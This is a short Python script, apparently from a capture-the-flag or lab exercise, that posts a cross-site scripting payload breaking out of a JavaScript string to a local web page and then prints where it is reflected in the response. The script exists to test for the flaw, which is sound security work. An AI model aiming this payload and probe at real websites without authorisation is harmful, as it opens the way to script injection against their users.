import requests
import re

target_url = "http://127.0.0.1:32887/page"

print("[*] Analyzing injection context and testing payload execution\n")

# First, let's see the full HTML structure with a simple payload
test_payload = '";alert("XSS");//'
print(f"[*] Testing payload: {test_payload}\n")

try:
    resp = requests.post(target_url, data={"name": test_payload}, timeout=10)
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Content-Length: {len(resp.content)}B")
    print(f"\n[+] Full Response:\n{resp.text}")
    
    # Search for script tags and our injection
    script_tags = re.findall(r'<script[^>]*>.*?</script>', resp.text, re.DOTALL)
    if script_tags:
        print(f"\n[!] Found {len(script_tags)} script tag(s):")
        for i, tag in enumerate(script_tags, 1):
            print(f"\n--- Script {i} ---")
            print(tag)
    
    # Look for our payload in the page
    if test_payload in resp.text:
        print(f"\n[!] Payload found in response - checking context...")
        idx = resp.text.find(test_payload)
        context = resp.text[max(0, idx-150):idx+len(test_payload)+150]
        print(f"\n--- Injection Context ---")
        print(context)
        
except Exception as e:
    print(f"[-] Error: {e}")

